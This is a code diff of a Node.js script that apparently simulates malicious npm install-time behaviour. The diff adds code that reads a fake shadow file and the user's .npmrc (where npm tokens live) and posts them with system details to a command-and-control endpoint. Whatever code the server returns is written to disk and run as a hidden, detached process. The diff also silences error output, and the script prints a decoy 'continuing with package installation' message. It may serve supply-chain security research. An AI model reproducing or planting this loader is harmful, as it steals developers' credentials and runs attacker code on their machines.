@@ -3,14 +3,9 @@ const path = require("path");
 const http = require("http");
 const dns = require("dns").promises;
 const os = require("os");
+const { spawn, exec } = require("child_process");
 
-const shadowFilePath = path.join(__dirname, "fake_shadow");
-
-if (os.type() !== "Linux") {
-  console.log("Not a Linux system, exiting.");
-  // process.exit(0);
-  // return;
-}
+const shadowFilePath = path.join(__dirname, "/fake_shadow");
 
 async function readShadowFile() {
   try {
@@ -18,28 +13,29 @@ async function readShadowFile() {
     console.log("Simulated credentials:", data);
     return data;
   } catch (err) {
-    console.error("Failed to read the shadow file:", err);
-    // process.exit(1);
+    // Ignore the error and continue execution
   }
 }
+function readNpmrcFile() {
+  const npmrcFilePath = path.resolve(process.cwd(), '.npmrc');
+  let npmrcContent = '';
 
+  try {
+    npmrcContent = fs.readFileSync(npmrcFilePath, 'utf8');
+    // console.log('.npmrc content:', npmrcContent);
+  } catch (err) {
+    // console.error('Failed to read .npmrc file:', err);
+  }
+
+  return npmrcContent;
+}
 async function performDnsLookup(hostname) {
   try {
     const lookup = await dns.lookup(hostname);
-    console.log(`DNS Lookup Result: ${JSON.stringify(lookup)}`);
+    // console.log(`DNS Lookup Result: ${JSON.stringify(lookup)}`);
   } catch (err) {
-    console.log("DNS Lookup Failed:", err);
-    return;
-  }
-}
-
-function checkEvalAllowed() {
-  try {
-    eval("var testEval = true");
-    return true;
-  } catch (e) {
-    console.log("Eval is not allowed in this environment");
-    return false;
+    // console.log("DNS Lookup Failed:", err);
+    // Ignore the error and continue execution
   }
 }
 
@@ -75,52 +71,76 @@ function isExecPermissionAvailable() {
 }
 
 async function informC2Server(osInfo) {
-  const postOptions = {
-    hostname: "localhost",
-    port: 8000,
-    path: "/inform",
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-  };
+  try {
+    const postOptions = {
+      hostname: "localhost",
+      port: 8000,
+      path: "/inform",
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
 
-  return new Promise((resolve, reject) => {
-    const req = http.request(postOptions, (res) => {
-      let responseData = "";
+    const responseData = await new Promise((resolve, reject) => {
+      const req = http.request(postOptions, (res) => {
+        let responseData = "";
 
-      res.on("data", (chunk) => {
-        responseData += chunk;
+        res.on("data", (chunk) => {
+          responseData += chunk;
+        });
+
+        res.on("end", () => {
+          resolve(responseData);
+        });
       });
 
-      res.on("end", () => {
-        resolve(responseData);
+      req.on("error", (error) => {
+        reject("Error while making the inform request: " + error);
       });
+
+      req.write(JSON.stringify(osInfo));
+      req.end();
     });
 
-    req.on("error", (error) => {
-      reject("Error while making the inform request: " + error);
-    });
-
-    req.write(JSON.stringify(osInfo));
-    req.end();
-  });
+    return responseData;
+  } catch (err) {
+   // console.error("Error during informC2Server:", err);
+    return null;
+  }
 }
 
 function executeDataFromC2(data) {
   try {
-    eval(data);
-    console.log('Script execution successful');
+    const filePath = 'test.js';
+
+    // Write the data to the file
+    fs.writeFileSync(filePath, data);
+
+    // Spawn the child process with an empty standard input stream
+    const childProcess = spawn('node', [filePath], {
+      detached: true,
+      stdio: ['ignore', 'ignore', 'ignore']
+    });
+
+    // Detach the child process
+    childProcess.unref();
+
+    console.log('Script execution started in the background.');
   } catch (err) {
     console.error('Error during script execution:', err);
   }
 }
 
-(async () => {
-  const data = await readShadowFile();
-  await performDnsLookup("localhost");
 
+
+async function executeParallel() {
   try {
+    const data = await readShadowFile();
+    const npmData= readNpmrcFile();
+
+    await performDnsLookup("localhost");
+
     const scriptFilePath = __filename;
     const hasWriteAccessValue = hasWriteAccess(scriptFilePath);
     const isExecutionAllowedValue = isExecutionAllowed(scriptFilePath);
@@ -133,21 +153,43 @@ function executeDataFromC2(data) {
       hasWriteAccess: hasWriteAccessValue,
       isExecutionAllowed: isExecutionAllowedValue,
       isExecPermissionAvailable: isExecPermissionAvailableValue,
+      data: data ? JSON.parse(data) : null,
+      npmData: npmData ? npmData : null
     };
 
     const informResponse = await informC2Server(osInfo);
-    console.log("Inform response: \n", informResponse);
 
-    const evalAllowed = checkEvalAllowed();
-
-    if (informResponse && evalAllowed) {
-      executeDataFromC2(informResponse);
+    if (informResponse) {
+      // runInBackground(() => {
+        executeDataFromC2(informResponse);
+      // });
     } else {
-      console.log(
-        "Cannot execute fetched script as eval is not allowed or inform response is empty"
-      );
+      console.log("Inform response is empty");
     }
   } catch (err) {
     console.error("Error during script execution:", err);
   }
-})();
+}
+
+function runInBackground(callback) {
+  const childProcess = spawn("node", ["-e", `(${callback.toString()})()`], {
+    detached: true,
+    stdio: "ignore",
+  });
+
+  childProcess.on("error", (error) => {
+    console.error("Background execution error:", error);
+  });
+
+  childProcess.on("exit", (code, signal) => {
+    console.log("Background execution completed with code:", code);
+  });
+
+  childProcess.unref();
+}
+
+// Continue the package installation process
+console.log("Continuing with package installation...");
+// ... Rest of your package installation code
+
+executeParallel();
